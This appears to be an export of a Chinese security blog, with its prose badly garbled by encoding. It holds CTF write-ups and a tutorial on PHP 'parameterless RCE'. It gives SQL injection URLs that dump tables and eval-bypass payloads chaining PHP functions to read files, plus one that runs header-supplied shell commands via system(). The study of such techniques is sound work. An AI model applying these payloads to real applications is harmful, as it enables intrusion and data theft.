<p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Sqil"><a href="#Sqil" class="headerlink" title="Sqil"></a><strong>Sqil</strong></h3><p>é¦–å…ˆfuzzä¹‹åå‘ç°æ­£åˆ™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i&quot;</span>, $id);</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿‡æ»¤inå’Œorè¢«è¿‡æ»¤äº†ï¼Œæ„å‘³ç€information_schemaä¸èƒ½ä½¿ç”¨</p>
<p>ä¸€èˆ¬æ¥è¯´ç»•è¿‡informationæœ‰ä¸¤ç§</p>
<ul>
<li>sys.x$schema_flattened_keys</li>
<li>sys.schema_table_statistics_with_buffer</li>
</ul>
<p>ä½†æ˜¯ç¬¬äºŒç§é‡Œçš„statè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæ³¨å‡ºè¡¨åpayload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,group_concat(table_name)from/**/sys.x$schema_flattened_keys/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 [id] =&gt; 1 [1] =&gt; 2 [username] =&gt; 2 [2] =&gt; flllaaaggg,users [password] =&gt; flllaaaggg,users )</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰flllaaaggg,usersä¸¤ç§è¡¨ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ— åˆ—åæ³¨å…¥ï¼Œæ— åˆ—åæ³¨å…¥å¯å‚è€ƒï¼š<a class="foo" href="https://www.jianshu.com/p/6eba3370cfab" target="_blank">ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥</a></p>
<p>æŸ¥çœ‹usersè¡¨å†…å®¹</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(c)/**/from(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select*from/**/users)x)%23</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹fllllaaagggè¡¨å†…å®¹</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/a,2/**/as/**/b/**/union/**/select*from/**/flllaaaggg)x)%23</span><br></pre></td></tr></table></figure>

<h3 id="MISC-welcome"><a href="#MISC-welcome" class="headerlink" title="MISC-welcome"></a><strong>MISC-welcome</strong></h3><p>å‰é¢æ²¡è®°é”™çš„è¯ï¼Œåº”è¯¥æ˜¯è™ç¬¦çš„åŸé¢˜å§ï¼Œé¢˜ç›®é™„ä»¶æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª<code>flag.rar</code>  ä¸€ä¸ª<code>red_blue.png</code>ã€‚</p>
<p>ç”¨<code>stegsolve</code>æŸ¥çœ‹å›¾ç‰‡ï¼Œ<code>Save Bin</code>å¯ç›´æ¥å¾—åˆ°å›¾ç‰‡æå–å‡ºæ¥å‘ç°æ˜¯å¯†ç ä¸º<code>/*///1258/*/@#</code></p>
<p>360è§£å‹æ‰“å¼€å‘ç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Ao(mgHXo,o0fV<span class="string">&#x27;I2J&quot;^%3&amp;**H@q.MQ1,V%$1GCdB0P&quot;X%0RW</span></span><br></pre></td></tr></table></figure>

<p>å½“æ—¶æ²¡æƒ³åˆ°æ˜¯base85ç¼–ç ï¼Œæ‰€ä»¥æ²¡åšå‡ºæ¥</p>
<p>åœ¨çº¿è§£å¯†å¾—åˆ°flagï¼š<a href="http://ctf.ssleye.com/base85.html">http://ctf.ssleye.com/base85.html</a></p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>æ— å‚æ•°RCE</title>
    <url>/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>æ— å‚æ•°RCEæ–¹æ³•å°æ€»ç»“ï¼Œå¯ä»¥å‚è€ƒ</p>
<p><a class="foo" href="https://xz.aliyun.com/t/6737" target="_blank">ä»ä¸€é“CTFé¢˜å­¦ä¹ Fuzzæ€æƒ³</a></p>
<h1 id="æ— å‚æ•°RCEé¢˜ç›®"><a href="#æ— å‚æ•°RCEé¢˜ç›®" class="headerlink" title="æ— å‚æ•°RCEé¢˜ç›®"></a><strong>æ— å‚æ•°RCEé¢˜ç›®</strong></h1><h1 id="ä¾‹é¢˜ä¸€"><a href="#ä¾‹é¢˜ä¸€" class="headerlink" title="ä¾‹é¢˜ä¸€"></a><strong>ä¾‹é¢˜ä¸€</strong></h1><p>é¢˜ç›®æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<p>å…¶ä¸­æ­£åˆ™é‡Œé¢çš„<code>\w</code>è¡¨ç¤º<code>a-z</code>ã€<code>A-Z</code>ã€<code>0-9</code>ï¼Œä»¥åŠä¸‹åˆ’çº¿ã€‚<code>(?R)</code>æ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œå³å¯ä»¥ç”¨<code>\w+\((?R)?\)</code>æ›¿æ¢åˆ°<code>(?R)</code>çš„ä½ç½®ï¼Œ<code>(?R)?</code> è¿™é‡Œå¤šä¸€ä¸ª<code>?</code>è¡¨ç¤ºå¯ä»¥æœ‰å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è¡ç”ŸåŒ¹é…ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´<code>/[^\W]+\((?R)?\)/</code>ï¼ŒåªåŒ¹é…<code>å­—ç¬¦ä¸²+()</code>çš„ç±»å‹ï¼Œå¹¶ä¸”å¯ä»¥åµŒå¥—ä½¿ç”¨ã€‚</p>
<p>å¯ä»¥çœ‹ä¸€ä¸ªä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code1 = <span class="string">&quot;echo();&quot;</span>;</span><br><span class="line">$code2 = <span class="string">&quot;echo(123);&quot;</span>;</span><br><span class="line">$code3 = <span class="string">&quot;echo(phpinfo());&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code1));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code2));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code3));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">echo(<span class="number">123</span>);</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åˆ†åˆ«ä¼ å…¥äº†<code>echo();</code>ï¼Œ<code>echo(123)</code>å’Œ<code>echo(phpinfo())</code>ï¼Œå¯ä»¥çœ‹åˆ°å‚æ•°ä¸€æœ€ç»ˆæ›¿æ¢å‰©ä¸‹ä¸€ä¸ª<code>(;)</code>åˆ†å·ï¼Œè€Œå‚æ•°äºŒæ— æ³•åŒ¹é…æˆåŠŸæ›¿æ¢å¤±è´¥ï¼Œå‚æ•°ä¸‰æ˜¯echoåµŒå¥—ä¸€ä¸ªphpinfoå‡½æ•°ï¼ŒåŒæ ·åŒ¹é…æˆåŠŸæ›¿æ¢å‰©ä¸‹ä¸€ä¸ª<code>(;)</code>åˆ†å·ã€‚é‚£ä¹ˆè¿™é‡Œå°±è¯´æ˜äº†æˆ‘ä»¬è¿™ä¸ªæ­£åˆ™è™½ç„¶ä¸èƒ½èƒ½å¤ŸåŒ¹é…å­˜åœ¨å‚æ•°çš„å‡½æ•°ï¼Œä½†æ˜¯å¯ä»¥åµŒå¥—å‡½æ•°ä½¿ç”¨ã€‚</p>
<h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a><strong>æ–¹æ³•ä¸€</strong></h3><p>æˆ‘ä»¬çŸ¥é“<code>scandir()</code>å‡½æ•°å¼èƒ½å¤Ÿè¯»å–ç›®å½•æºç ï¼Œä½†æ˜¯ä»–å¿…é¡»å¸¦æœ‰å‚æ•°<code>ï¼ˆ&#39;.&#39;ï¼‰</code>ä¹Ÿå°±æ˜¯<code>scandir(&#39;.&#39;)</code>ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(<span class="string">&#x27;.&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸Šé¢çš„æ­£åˆ™åŒ¹é…ä¸å…è®¸å‡ºç°å‡½æ•°é‡Œé¢æœ‰ç‚¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•æ„é€ è¿™ä¸ªç‚¹ã€‚</p>
<p>åˆ©ç”¨<code>localeconv()</code> å–ç‚¹ï¼Œ<code>localeconv()</code> ä¼šè¿”å›å½“åœ°çš„é‡‘èä¿¡æ¯çš„æ•°ç»„ï¼Œè€Œç¬¬ä¸€ä¸ªå…ƒç´ å³ä¸ºç‚¹ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(localeconv()); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ æ–¹æ³•åªéœ€å–ç¬¬ä¸€ä¸ªå…ƒç´ å³å¯ <code>pos()</code>ã€<code>current()</code> å‡å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(pos(localeconv())); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“åˆèµ·æ¥å°±æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(pos(localeconv()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨endè¯»å–åä¸€ä¸ªæ–‡ä»¶åè¯»å–ï¬‚ag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(end(scandir(pos(localeconv())))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨readï¬leè¯»å–ï¬‚ag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(readfile(end(scandir(pos(localeconv()))))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a><strong>æ–¹æ³•äºŒ</strong></h3><p>åˆ©ç”¨å½“å‰ç§’æ•°æ„é€ ç‚¹  ï¼Œåˆ©ç”¨localtime()ä¸­è¿”å›çš„ç§’æ•°æ¥æ„é€ ç‚¹ï¼Œç‚¹çš„aiiscç æ­£å¥½æ˜¯46åœ¨60ç§’ä¹‹ å†…ï¼Œæˆ‘ä»¬åªéœ€ç­‰åˆ°46ç§’æ—¶å€™å°±èƒ½å°†ç‚¹ç»™æ„é€ å‡ºæ¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(chr(pos(localtime()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a><strong>æ–¹æ³•ä¸‰</strong></h3><p>åˆ©ç”¨SESSIONIDæ¥ä¼ å‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>åœ¨cookieå¤„è¾“å…¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="æ–¹æ³•å››"><a href="#æ–¹æ³•å››" class="headerlink" title="æ–¹æ³•å››"></a><strong>æ–¹æ³•å››</strong></h3><p>åˆ©ç”¨ <code>getallheaders()</code> æ¥è·å–å‚æ•°RCEï¼Œè¿™é‡Œéœ€è¦ç”¨burpæŠ“åŒ…æ“ä½œã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>åœ¨æœ€ååœ¨æœ€åä¸€æ¡è¯·æ±‚å¤´æ·»åŠ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>

<h1 id="ä¾‹é¢˜äºŒ"><a href="#ä¾‹é¢˜äºŒ" class="headerlink" title="ä¾‹é¢˜äºŒ"></a><strong>ä¾‹é¢˜äºŒ</strong></h1><p>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒï¼Œæºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ ç‚¹é—®é¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤ä¸ªéƒ½èƒ½ç”Ÿæˆç‚¹ã€‚</p>
<p>ä¼ å‚æ•°å‘ç°</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; </span><br></pre></td></tr></table></figure>

<ul>
<li>exp1</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­array_reverseæ˜¯å°†æ•°ç»„å†…å®¹åè½¬ä¸€ä¸‹ï¼Œåˆ©ç”¨next()æŒ‡å‘flag.phpæ–‡ä»¶ã€‚</p>
<ul>
<li>exp2</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ï¼Œarray_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p>
<p>å¤šåˆ·åˆ·å°±å‡ºflagã€‚</p>
<ul>
<li>exp3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="è·³è½¬ç›®å½•æƒ…å†µ"><a href="#è·³è½¬ç›®å½•æƒ…å†µ" class="headerlink" title="è·³è½¬ç›®å½•æƒ…å†µ"></a><strong>è·³è½¬ç›®å½•æƒ…å†µ</strong></h1><ul>
<li><p>å‡è®¾ï¬‚agåœ¨ä¸Šå±‚ç›®å½•æ–‡ä»¶çš„æƒ…å†µï¼Œæˆ‘ä»¬éœ€è¦è·³è½¬åˆ°ä¸Šå±‚ç›®å½•ã€‚ </p>
</li>
<li><p><code>chdir()</code> å‡½æ•°å½“å‚æ•°ä¸ºä¸¤ä¸ªç‚¹çš„æ—¶å€™èƒ½å¤Ÿè·³è½¬åˆ°ä¸Šå±‚ç›®å½•ã€‚<code>scandir()</code> ï¼Œè¯»å–å½“å‰ç›®å½•åœ¨ç¬¬äºŒä¸ªå…ƒç´ å°±èƒ½è¯»å–ä¸¤ä¸ªç‚¹</p>
</li>
<li><p><code>localtime</code>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ—¶é—´æˆ³ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åµŒå¥—ï¼Œéœ€è¦å¸¦ä¸€ä¸ªtimeå‡½æ•°ä½œä¸ºåµŒå¥—ã€timeå‡½æ•°èƒ½å¤Ÿè¿”å›æ—¶é—´æˆ³</p>
</li>
<li><p>æ„é€ è¯»å–ä¸Šå±‚ç›®å½•payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>

<ul>
<li>æ„é€ è¯»å–ä¸Šå±‚ç›®å½•æ–‡ä»¶payload</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<h1 id="å…¶ä»–å°æŠ€å·§"><a href="#å…¶ä»–å°æŠ€å·§" class="headerlink" title="å…¶ä»–å°æŠ€å·§"></a><strong>å…¶ä»–å°æŠ€å·§</strong></h1><p>åˆ©ç”¨ä¸‰è§’å‡½æ•°æ„é€ æ–œæ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨éšæœºä»¤ç‰Œæ„é€ ç‚¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure>

<h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a><strong>å°ç»“</strong></h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚</span><br><span class="line">array_reverse() ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„</span><br><span class="line">scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line">dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚</span><br><span class="line">chdir()   å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</span><br><span class="line">localeconv() è¿”å›å½“åœ°é‡‘èä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«äº†ç‚¹</span><br><span class="line">readfile() Â  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶</span><br><span class="line">chr(pos(localtime())) åˆ©ç”¨å½“å‰ç§’æ•°æ„é€ ç‚¹ Â  Â </span><br><span class="line">current() Â  Â è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</span><br><span class="line">pos() Â  Â  Â current() çš„åˆ«å</span><br><span class="line">next()     å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">end() Â  Â  Â å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_rand() Â  å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœº é”®åçš„æ•°ç»„ã€‚Â </span><br><span class="line">array_flip()   å‡½æ•°ç”¨äºåè½¬&#x2F;äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</span><br><span class="line">chr()  å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚</span><br><span class="line">hex2bin()  è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="line">getenv() Â  è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</span><br><span class="line">show_source() é«˜äº®è¯»å–æ–‡ä»¶</span><br><span class="line">highlight_file() é«˜äº®è¯»å–æ–‡ä»¶</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>æ— å­—ç¬¦æ„é€ webshell</title>
    <url>/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>å­¦ä¹ ä¸€æ³¢å¥‡æ·«å·§è®¡ï¼Œæœ¬ç¯‡å¤§é‡å‚è€ƒäº†Pç¥ç¦»åˆ«æ­Œçš„æ–‡ç« ï¼š</p>
<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p>
<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></p>
<h1 id="æ— å­—ç¬¦ç»•è¿‡"><a href="#æ— å­—ç¬¦ç»•è¿‡" class="headerlink" title="æ— å­—ç¬¦ç»•è¿‡"></a><strong>æ— å­—ç¬¦ç»•è¿‡</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>æœ¬ç¯‡PHPç¯å¢ƒä¸º5.6</li>
</ul>
